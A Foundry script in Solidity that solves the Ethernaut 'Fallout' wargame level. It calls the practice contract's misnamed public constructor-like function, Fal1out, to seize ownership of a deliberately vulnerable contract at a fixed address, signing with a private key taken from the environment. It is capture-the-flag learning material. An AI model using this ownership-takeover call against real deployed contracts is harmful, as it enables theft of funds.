// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../src/Ethernaut/fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutScript is Script {
    Fallout public instance =
        Fallout(payable(0xD9E81a7A1CE24273AEEfb1871B7fAe08f5d0e593));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        instance.Fal1out{value: 1 wei}();
        vm.stopBroadcast();
    }
}
